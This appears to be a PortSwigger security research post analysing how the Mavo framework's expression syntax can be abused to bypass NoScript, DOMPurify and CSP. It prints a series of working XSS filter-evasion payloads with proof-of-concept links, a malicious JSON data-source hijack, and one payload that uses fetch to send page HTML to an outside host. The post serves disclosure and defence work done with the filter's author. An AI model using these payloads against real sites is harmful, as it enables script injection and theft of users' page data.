---
source: portswigger-research
source_url: https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations
title: "Abusing JavaScript frameworks to bypass XSS mitigations | PortSwigger Research"
published: 2017-09-08T14:53:00
description: "At AppSec Europe Sebastian Lekies, Krzysztof Kotowicz and Eduardo Vela Nava showed how to use JavaScript frameworks to bypass XSS mitigations. In this post I’ll do a systematic analysis of how the bra"
---

# Abusing JavaScript frameworks to bypass XSS mitigations

![Gareth Heyes](https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](https://portswigger.net/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

- **Published:** Friday, 8 September 2017 at 14:53 UTC

- **Updated:** Friday, 14 June 2019 at 12:14 UTC


At AppSec Europe Sebastian Lekies, Krzysztof Kotowicz and Eduardo Vela Nava showed how to use [JavaScript frameworks to bypass XSS mitigations](https://www.youtube.com/watch?v=p07acPBi-qw). In this post I’ll do a systematic analysis of how the brand new framework [Mavo](https://mavo.io/) can be abused to bypass [XSS](https://portswigger.net/web-security/cross-site-scripting) mitigations, specifically NoScript’s XSS filter. Mavo aims to simplify web development by enabling users to create interactive web applications using pure HTML. It was released on [Smashing magazine](https://www.smashingmagazine.com/2017/05/introducing-mavo/) and caught my interest on Twitter. So I began looking at its syntax and functionality.

### DOM based XSS using $url

Mavo creates an object called $url which provides a convenient way for a developer to access GET parameters. If for example you wanted to access the GET parameter “x” then you would access the “x” property of the $url object.

`$url.x //retrieves the GET parameter x`

Unfortunately this convenience also increases the likelihood that the developer will introduce a DOM based XSS vulnerability. I reported one such issue to the CSS working group on the 31st May 2017. They use [Mavo to manage comments](https://drafts.csswg.org/issues?spec=css-images&doc=cr-2012) on the CSS specification and they used $url to assign an anchor href. The HTML looked like this:

`<h1><a href="{$url.spec}" mv-attribute="null" property="title"></a></h1>`

So as you can see they were using the $url object to get the parameter spec from the URL. However this link will only be shown when valid data is retrieved, I needed to inject a JavaScript URL that was also a valid relative URL so the data would be retrieved and the link would be shown.

`javascript:alert(1)%252f%252f..%252fcss-images`

The vector above provides a valid relative URL so Mavo looks for the data in a non-existent javascript:alert(1) folder but then traverses up using two double encoded slashes and “..”. I use two slashes so it acts as a comment in JavaScript too which comments out the rest of the path when executed as a JavaScript URL. Then it goes back into the css-images directory so the data is successfully loaded and the URL is displayed.

Because Mavo works client side we can replicate this issue on our server and the proof of concept is available below:

[Proof-of-concept](http://portswigger-labs.net/mavo_dom_based_xss/?spec=javascript:alert(1)%252f%252f..%252fcss-images&doc=cr-2012)

(Click on CSS Image Values and Replaced Content Level 3 title)

### Remotely loading JSON data

As a feature in Mavo it’s possible to change the data source of any Mavo app to local storage or remote locations. This is bad because you give control over your data to an attacker who can use it to deface your site or inject malicious JavaScript URLs. The invoice demo app on the Mavo website has this vulnerability, it is possible to use the source parameter to point to an external JSON file and customise the data on the invoice app.

The external JSON file has the [CORS](https://portswigger.net/web-security/cors) header “Access-Control-Allow-Origin:\*” to enable the data to be loaded cross domain. Then the app used the data to create an anchor href like this:

`<a property="companyURL" mv-attribute="null" href="[companyURL]" target="_blank">http://lea.verou.me</a>`

In the href attribute the invoice app uses a Mavo expression, “companyURL” is retrieved from the JSON data. If I include the following in the external JSON file:

`{
"companyLogo": "http://lea.verou.me/logo.svg",
"companyName": "Pwnd Pwnd",
"companyAddress": "Pwnd",
"companyURL": "javascript:alert(1)",
"companyEmail": "pwnd",
...`

This will then create a JavaScript URL in the document because the external data is loaded and replaces the current data.

[Proof-of-concept](http://portswigger-labs.net/mavo_invoice/?source=http://subdomain1.portswigger-labs.net/mavo_invoice/invoices.php)

### Bypassing NoScript XSS detection

By default Mavo allows you to embed MavoScript inside square brackets in the HTML document. MavoScript is an extension of JavaScript with a couple of minor changes. For example it supports the keywords ‘and’, ‘or’, and ‘mod’, it changes the behaviour of ‘=’ to be comparison not assignment and supports various convenient functions from the Math and date objects. You can also call Math methods without using the Math object like max(1,2,3). More information on the syntax is available [here](https://mavo.io/docs/mavoscript/).

If Mavo encounters invalid MavoScript, it falls back to standard JavaScript. To force JavaScript mode you can use a comment at the start of your expression.

Let's say we want to Mavo to evaluate the expression 1+1 inside a HTML document and the page is vulnerable to XSS. Mavo uses \[\] to evaluate expressions like Angular uses {{}}, so we would inject following expression:

`[1+1]`

[Expression example](http://portswigger-labs.net/mavo/?inj=[1%2b1])

There is no sandboxing at all in Mavo but your code gets rewritten and is executed within a with statement. To call the alert function we need to use the window object so either window.alert or self.alert.

`[self.alert(1)]`

[Calling alert](http://portswigger-labs.net/mavo/?inj=[self.alert(1)])

It’s possible to call alert without window, by [using an indirect call](https://portswigger.net/blog/dom-based-angularjs-sandbox-escapes#indirectcall)

`[(1,alert)(1)]`

Mavo also has some custom HTML attributes that are interesting. mv-expressions allow you to define characters that are used as expression delimiters. For instance if you want to use Angular’s double curly syntax you could do that by using the mv-expressions attribute.

`<div mv-expressions="{{ }}">{{top.alert(1)}}</div>`

[Defining your own expression delimiter](http://portswigger-labs.net/mavo/?inj=%3Cdiv%20mv-expressions=%22%7B%7B%20%7D%7D%22%3E%7B%7Btop.alert(1)%7D%7D%3C/div%3E)

Mavo also supports the “property” attribute (this is not prefixed because it’s part of a standard). This links a DOM element's value to a JavaScript variable. The example from the Mavo site demonstrates this well.

`<p>Slider value: [strength]/100</p>
<input type="range" property="strength" title="[strength]%" />`

mv-value and mv-if are interesting because they allow execution of expressions without the \[\] delimiters. mv-if hides the DOM element if the expression evaluates to false and mv-value evaluates an expression and changes the DOM element’s value. It’s worth noting that these attributes would work on any tag.

`<div mv-if=”false”>Hide me</div>`

Inside expressions MavoScript has some interesting behaviour. You can have quoteless strings as long as they consist of letters, numbers, and underscores. Object properties will be converted to a blank string if they don’t exist. E.g. you can have x.y.z even if none of those properties exist.

With all this knowledge I began testing to see if I could bypass NoScript’s XSS filter, DOMPurify and [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy). I used a [testbed](http://gadgets.kotowicz.net/mavo/?sanitize=dompurify&inj=) that [Krzysztof Kotowicz](https://twitter.com/kkotowicz) had created. Bypassing DOMPurify was pretty easy because you could use data-\* attributes with Mavo. Normally in Mavo you would use the mv- prefix but Mavo also supports data-mv-\* to enable the document to pass HTML validation. In order for Mavo to be used with CSP you have to enable the ‘unsafe-eval’ directive. This is bad because now we can now call the various eval functions in JavaScript and as we’ve seen Mavo lets you inject MavoScript/JavaScript expressions too.

I worked with [Giorgio Maone](https://twitter.com/ma1) (NoScript’s creator) and attempted to bypass NoScript. My first bypass was to use the “fetch” function in JavaScript to prove I could bypass the filter and retrieve and send HTML to a remote destination.

`[1 and self.fetch('//subdomain2.portswigger-labs.net/'&encodeURIComponent(document.body.innerHTML))]`

Because NoScript’s filter didn’t understand the “and” keyword and the square bracket expression syntax I could bypass the detection and use fetch to send the HTML. Mavo also defines “&” as a concat operator and I use it here instead of “+” to concatenate the string.

[Proof-of-concept](http://portswigger-labs.net/mavo/?csp=1&dompurify=1&inj=%3Cdiv%3E[1%20and%20self.fetch(%27//subdomain2.portswigger-labs.net/%27%26encodeURIComponent(document.body.innerHTML))]%3C/div%3E)

Giorgio then modified NoScript’s XSS detection to check for these new keywords and the square bracket syntax. I was able to bypass it again by abusing the MavoScript parser.

`[''=''or self.alert(lol)]`

So here the MavoScript parser allows you to use “=” for equality testing rather than assignment. I used this to my advantage to evade NoScript. MavoScript defines “or” as an operator and because this isn’t part of JavaScript NoScript didn’t look for it.

[Proof-of-concept](http://portswigger-labs.net/mavo/?csp=1&dompurify=1&inj=[%27%27=%27%27or%20self.alert(lol)])

As I’ve mentioned earlier Mavo also allows you to execute expressions without delimiters inside a mv-if attribute. I used this to bypass the new detection code in NoScript.

`<a data-mv-if='1 or self.alert(1)'>test</a>`

[Proof-of-concept](http://portswigger-labs.net/mavo/?csp=1&dompurify=1&inj=%3Ca%20data-mv-if=%271%20or%20self.alert(1)%27%3Etest%3C/a%3E)

Remember the mv-expressions attribute? You can define your own delimiters but you can use any characters to do that. I used data attributes again to evade DOMPurify.

`<div data-mv-expressions="lolx lolx">lolxself.alert('lol')lolx</div>`

[Proof-of-concept](http://gadgets.kotowicz.net/mavo/?csp=sd&sanitize=dompurify&inj=%3Cdiv%20data-mv-expressions=%22lolx%20lolx%22%3Elolxself.alert(%27lol%27)lolx%3C/div%3E)

Next I decided to see how I could use HTML attributes with Mavo. I looked at the anchor href attribute because I was injecting a JavaScript URL I switched off the CSP check for this vector.

`<a href=[javascript&':alert(1)']>test</a>`

So here we have our expression inside the href attribute. Javascript is actually a string even though there are no quotes, the & acts as a concat operator and that joins the :alert(1) string notice we have to use quotes this time because of the parenthesis.

[Proof-of-concept](http://portswigger-labs.net/mavo/?dompurify=1&inj=%3Ca%20href=[javascript%26%27:alert(1)%27]%3Etest%3C/a%3E)

Giorgio improved NoScript some more and detected the above vector. Then I found a bypass which used multiple attributes on the element to smuggle the vector. Multiple expressions can be used inside attributes and can be concatenated together.

`<a href='[javascript][":"][x.title][1][x.rel]' rel=) id=x title=alert(>test</a>`

[Proof-of-concept](http://portswigger-labs.net/mavo/?dompurify=1&inj=%3Ca%20href=%27[javascript][%22:%22][x.title][1][x.rel]%27%20rel=)%20id=x%20title=alert(%3Etest%3C/a%3E)

You can also mix a regular attribute value with expressions too and evade the filter.

`<a href=javascript[x.rel]1) id=x rel=:alert(>test</a>`

[Proof-of-concept](http://portswigger-labs.net/mavo/?dompurify=1&inj=%3Ca%20href=javascript[x.rel]1)%20id=x%20rel=:alert(%3Etest%3C/a%3E)

By this point Nocript’s detection of these type of vectors was getting pretty good. I came up with one last vector to bypass it in this context.

`[/**/x='javascript'][/**/x+=':alert'+y.rel+y.title]<a href=[x] id=y title=1) rel=(>test</a>`

I use comments to force JavaScript mode in Mavo. Once in JavaScript mode I need to use quotes for the string ‘javascript’, then I concat the string with values from the anchor attributes.

[Proof-of-concept](http://portswigger-labs.net/mavo/?dompurify=1&inj=[/**/x=%27javascript%27][/**/x%2b=%27:alert%27%2by.rel%2by.title]%3Ca%20href=[x]%20id=y%20title=1)%20rel=(%3Etest%3C/a%3E)

After that I looked at the Mavo parser because they use letters as an operator. I could this to my advantage to bypass detection as NoScript wasn’t expecting alphanumerics to follow a function call. This also bypasses CSP since we aren’t injecting JavaScript URLs anymore. Notice mod is an operator therefore allows 1 to follow the operator even without spaces.

`[self.alert(1)mod1]`

[Proof-of-concept](http://portswigger-labs.net/mavo/?csp=1&dompurify=1&inj=[self.alert(1)mod1])

Finally combining the fact that Mavo allows unquoted strings and unquoted strings directly after operator keywords such as “and” etc. I bypassed the check again.

`[omglol mod 1 mod self.alert(1)andlol]`

[Proof-of-concept](http://portswigger-labs.net/mavo/?csp=1&dompurify=1&inj=[omglol%20mod%201%20mod%20self.alert(1)andlol])

### Conclusion

Frameworks like Mavo can make life easier for developers, but introducing new syntax to HTML and JavaScript often has undocumented implications that undermine security mechanisms like CSP, NoScript and DOMPurify. They can also offer new ways to unwittingly introduce traditional vulnerabilities like DOMXSS into applications, and even introduce new types of vulnerability like data source hijacking.

Visit our Web Security Academy to [learn more about cross-site scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting)

[XSS](https://portswigger.net/research/cross-site-scripting-research) [mavo](https://portswigger.net/research/mavo) [JavaScript](https://portswigger.net/research/javascript)

[Back to all articles](https://portswigger.net/research/articles)

## Related Research

[**Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes** 03 September 2025Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes) [**Stealing HttpOnly cookies with the cookie sandwich technique** 22 January 2025Stealing HttpOnly cookies with the cookie sandwich technique](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) [**Bypassing WAFs with the phantom $Version cookie** 04 December 2024Bypassing WAFs with the phantom $Version cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie) [**Concealing payloads in URL credentials** 23 October 2024Concealing payloads in URL credentials](https://portswigger.net/research/concealing-payloads-in-url-credentials)